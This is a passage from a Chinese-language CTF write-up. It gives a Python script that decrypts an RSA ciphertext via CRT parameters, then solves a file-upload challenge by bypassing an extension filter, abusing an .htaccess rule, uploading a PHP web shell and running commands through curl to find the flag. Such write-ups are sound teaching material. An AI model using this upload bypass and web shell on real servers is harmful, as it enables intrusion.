    m1 = pow(c, dp, p)
    h = (qinv * (m1 - m2)) % p
    m = m2 + h * q
#### 完整脚本：
    from gmpy2 import *
    p=8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229
    q=12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469
    dp=6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929
    dq=783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041
    c=24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852
    def egcd(a, b):
        if a == 0:
           return (b, 0, 1)
        else:
            g, y, x = egcd(b % a, a)
            return (g, x - (b // a) * y, y)
    def modinv(a, m):
        g, x, y = egcd(a, m)
        if g != 1:
           raise Exception('modular inverse does not exist')
        else:
            return x % m
    qinv = modinv(q, p)
    m2 = pow(c, dq, q)
    m1 = pow(c, dp, p)
    h = (qinv * (m1 - m2)) % p
    m = m2 + h * q
    print(m)
    txt = hex(m)[2:]
    print ''.join([chr(int(''.join(c), 16)) for c in zip(txt[0::2],txt[1::2])])
#### 六：MyFileUploader
首先使用第一种，比较常见的方式：
由于该网站允许我们上传文件。让我们创建一个`php shell`文件，但将其保存为`dummy.txt`
    dummy.txt
然后，尝试上传它
由提示可以看出，这个上传的文件它希望文件名包含`.png / .jpg /
.gif`。让我们将`dummy.txt`文件重命名为`dummy.png.txt`并尝试再次上传
    File: dummy.png.txt
    Image uploaded to: Here
接下来我们看一下上传之后的网址：
    $ curl 'http://chal.noxale.com:8079/uploads/dummy.png.txt'
这个就表示我们已成功上传。我们试着查看`/ uploads /`下的内容
我们可以看到这里面有一个名为“`Don't open/`”的目录。让我们看看里面是什么
    Options +Indexes
    AddType application/x-httpd-php .cyb3r
从这里可以看出服务器使用`PHP`运行扩展名为`.cyb3r`的文件。
因此我们需要将文件重命名为`rce.png.cyb3r`并重新上传，就会得到：
我们可以由提示看出，我们成功上传了我们的`shell`文件。我们先来测试！！！
首先：看一下 
然后：
接下来使用`ls`命令就可以得到想要的答案：
    $ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=ls"
    1.jpg
    1.jpg%00php
    1.php%00jpg
    1.php.jpg
    1jpg
    2.php%00jpg
    2.php.jpg
    2.php;.jpg
    7H3-FL4G-1S-H3r3
    Don't open
    dummy.png.txt
    exec.png.cyb3r
    gif.phpjpg
    gifjpg
    rce.png.cyb3r
    shell.png.cyb3r
    shell.png.phtml
    uploadTest.txt
    $ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=file%207H3-FL4G-1S-H3r3"
    7H3-FL4G-1S-H3r3: directory
    $ curl "http://chal.noxale.com:8079/uploads/rce.png.cyb3r?cmd=ls%207H3-FL4G-1S-H3r3"
    noxCTF{N3V3R_7RU57_07H3R5}
最后得到答案： **noxCTF{N3V3R_7RU57_07H3R5}**
第二种方法：
打开链接：
让我们尝试上传这个非常可爱的`zzkjRTe.jpg`图片：
正如我们所看到的，它还为我们提供了在服务器上找到此图片的路径：
在探索这条路径之前，让我们尝试上传一个非常简单的`webshel​​l`名为`shell.php`。它实际上是[Arrexel](https://github.com/Arrexel/phpbash
"Arrexel")的剧本。
在我尝试了不同的东西之后，我理解我只需要放置`.png，.jpg`或者`.gif`在文件名中的任何位置。因此服务器仍将`evilshell.jpg.php`作为有效输
入，但`.php`如果存在于文件名的末尾，它将自动擦除。那是一个问题。
然后我去探索路径`/uploads`，我找到了一个名为`Do not open`的目录。你猜怎么了？我打开它。
里面有着一个名为：`.htaccess`文件，内容对我们还是有很大的帮助：
    Options +Indexes
    AddType application/x-httpd-php .cyb3r
这意味着任何以自制扩展名结尾的文件`.cyb3r`都将由服务器作为`php`代码处理。
接下来就变得简单了许多
让我们把我们的`phpbash shell`重命名为`shell.png.cyb3r`，然后上传它。
成功了！现在的时刻......让我们导航到我们的上传路径......
是的！得到了一个`webshel​​l`，
现在让我们列出这个名为`7H3-FL4G-1S-H3r3`文件夹里面的内容：
最后答案： **noxCTF{N3V3R_7RU57_07H3R5}**
参考资料：
**phpbash：**
**CTF中RSA的常见攻击方法 :** 
**CTF中那些脑洞大开的编码和加密:** 
**RSA之中国剩余定理：**
[https://en.wikipedia.org/wiki/RSA_(cryptosystem)](https://en.wikipedia.org/wiki/RSA_\(cryptosystem))
**Brainfuck/Ook! Obfuscation/Encoding：**